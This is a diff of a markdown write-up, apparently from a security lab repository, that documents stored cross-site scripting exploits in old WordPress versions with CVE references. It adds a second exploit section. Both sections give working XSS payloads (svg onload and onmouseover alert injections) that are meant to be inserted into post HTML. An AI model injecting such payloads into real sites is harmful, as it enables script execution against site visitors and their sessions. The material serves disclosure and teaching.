@@ -6,7 +6,7 @@ _Affected versions 4.0 - 4.7.2, fixed in 4.2.13_
 ##### Steps
 - Create a new Post
 - Switch from Visual editing mode to Text (HTML) editing mode
-- Insert the YouTube malicious embed shortcode
+- Insert the malicious YouTube embed shortcode
 
 `[embed src='https://www.youtube.com/embed/dQw4w9WgXcQ\x3csvg onload=alert("exploit!")\x3e'][/embed]`
 
@@ -19,3 +19,26 @@ _Affected versions 4.0 - 4.7.2, fixed in 4.2.13_
 
 ##### Walkthrough
 ![Walkthrough exploit 1](https://i.imgur.com/LqaLZgY.gif)
+
+#### Exploit 2: Authenticated Stored Cross-Site Scripting (XSS)
+_CVE-2015-5622_  
+_CVE-2015-5623_  
+_Affected versions 4.0 - 4.2.2, fixed in 4.2.3_  
+
+##### Steps
+- Create a new Post  
+- Switch from Visual editing mode to Text (HTML) editing mode
+- Insert the malicious a href code
+
+`<a href="[caption code=">]</a><a title=" onmouseover=alert('exploit!')  ">link</a>`
+
+##### References
+- https://wpvulndb.com/vulnerabilities/8111
+- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-5622
+- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-5623
+- https://wordpress.org/news/2015/07/wordpress-4-2-3/
+- https://twitter.com/klikkioy/status/624264122570526720
+- https://klikki.fi/adv/wordpress3.html
+ 
+##### Walkthrough
+![Walkthrough exploit 2](https://i.imgur.com/4nuw80g.gif)
